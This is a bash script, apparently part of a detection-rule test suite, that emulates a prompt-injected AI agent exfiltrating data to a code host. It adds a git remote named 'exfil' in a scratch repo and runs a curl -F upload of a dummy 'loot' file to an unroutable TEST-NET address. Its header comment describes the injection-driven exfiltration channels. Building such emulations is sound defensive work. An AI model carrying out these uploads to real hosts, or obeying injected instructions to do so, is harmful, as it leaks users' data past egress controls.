#!/usr/bin/env bash
# exfil.sh - benign emulation of an agent pushing data to a code host / registry, for detection-rule testing.
#
# What an attacker does: a prompt-injected agent exfiltrates over a channel the egress wall allows for
# code - a gist, a release upload, npm publish, a mirror push, or a curl -F upload to an API. This
# does the harmless analogue: it adds an out-of-task git remote (in a scratch repo, no network is
# touched) and curls a DUMMY file with -F to an UNROUTABLE TEST-NET address (nothing leaves; the
# egress wall would block it anyway). The out-of-task push/upload argv is the signal. See ./README.md.
#
# Account-scoped: rules/agent/agent_exfil_to_code_host.yml keys on User in {claude,redteam,lab}, so
# this only fires when run AS an agent account.
#
# Imitates: rules/agent/agent_exfil_to_code_host.yml - ATT&CK T1567.001 Exfil to Code Repository
# Expected rules: agent_exfil_to_code_host
set -u
work=$(mktemp -d) || exit 0
trap 'rm -rf "$work" 2>/dev/null' EXIT

# --- TTP: add an out-of-task remote (where a mirror push would go) -> agent_exfil_to_code_host (git_remote) ---
# 192.0.2.1 is TEST-NET-1 (RFC 5737): the remote is only recorded in the scratch repo; nothing is pushed.
if command -v git >/dev/null 2>&1; then
	git -C "$work" init -q >/dev/null 2>&1 || true
	git -C "$work" remote add exfil https://192.0.2.1/repo.git >/dev/null 2>&1 || true
fi

# --- TTP: curl -F upload of a dummy file to an API -> agent_exfil_to_code_host (upload) ---
printf 'dummy loot (harmless)\n' > "$work/loot.txt"
if command -v curl >/dev/null 2>&1; then
	curl -s --max-time 2 -F "file=@$work/loot.txt" "http://192.0.2.1/gate" >/dev/null 2>&1 || true
fi

exit 0
